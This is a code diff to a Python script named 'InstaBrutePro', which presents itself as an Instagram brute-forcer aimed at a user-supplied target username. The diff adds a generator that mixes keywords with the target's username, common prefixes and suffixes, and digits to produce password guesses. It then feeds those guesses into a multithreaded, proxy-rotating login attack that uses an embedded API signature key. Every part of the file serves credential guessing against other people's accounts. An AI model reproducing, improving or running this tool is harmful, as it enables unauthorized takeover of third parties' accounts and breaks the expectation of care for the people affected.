@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 import argparse
 import json
@@ -48,6 +49,29 @@ SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # Update from APK if needed
 found = False
 lock = threading.Lock()
 resume_line = 0
+
+def generate_variations(keyword, username, max_variations=100):
+    """Generate password variations containing the keyword."""
+    variations = set()
+    common_suffixes = ['123', '2025', 'ig', 'insta', 'pass', '', '456', '789', '2023', '2024']
+    common_prefixes = ['my', 'the', '123', 'insta', 'ig', '', 'test', 'super']
+    
+    # Keyword alone
+    variations.add(keyword)
+    # Keyword with prefixes/suffixes
+    for prefix in common_prefixes:
+        for suffix in common_suffixes:
+            variations.add(f"{prefix}{keyword}{suffix}")
+            variations.add(f"{keyword}{suffix}")
+            variations.add(f"{prefix}{keyword}")
+    # Username-based variations
+    variations.add(f"{username}{keyword}")
+    variations.add(f"{keyword}{username}")
+    # Numbers
+    for i in range(10):
+        variations.add(f"{keyword}{i}")
+        variations.add(f"{i}{keyword}")
+    return list(variations)[:max_variations]
 
 def is_valid_proxy(proxy):
     """Validate proxy format and connectivity."""
@@ -182,7 +206,7 @@ def main():
     global resume_line
     parser = argparse.ArgumentParser(description="InstaBrutePro: Elite Instagram Brute-Forcer by Soly")
     parser.add_argument('-u', required=True, help='Target username')
-    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist path')
+    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist path (keywords for substring matching)')
     parser.add_argument('-t', type=int, default=THREADS, help='Threads')
     parser.add_argument('-r', action='store_true', help='Resume session')
     parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
@@ -197,17 +221,23 @@ def main():
         print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
         return
 
-    # Load wordlist
-    print(f"{Colors.YELLOW}[*] Loading wordlist: {args.w}...{Colors.NC}")
+    # Load keywords and generate variations
+    print(f"{Colors.YELLOW}[*] Loading keywords from: {args.w}...{Colors.NC}")
     try:
         with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
-            words = [line.strip() for line in f if line.strip()]
+            keywords = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         print(f"{Colors.RED}[!] Wordlist not found: {args.w}{Colors.NC}")
         return
+    words = []
+    for keyword in keywords:
+        variations = generate_variations(keyword, args.u)
+        words.extend(variations)
+    words = list(set(words))  # Remove duplicates
     if args.r:
         resume_line = int(input(f"{Colors.YELLOW}Resume from line (0 for start): {Colors.NC}") or 0)
         words = words[resume_line:]
+    print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
 
     # Proxies
     print(f"{Colors.YELLOW}[*] Loading proxies...{Colors.NC}")
@@ -234,7 +264,7 @@ def main():
     for word in words:
         queue.put(word)
 
-    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u}... Buckle up!{Colors.NC}")
+    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} with keyword variations... Buckle up!{Colors.NC}")
     with ThreadPoolExecutor(max_workers=args.t) as exec:
         futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
         for future in futures:
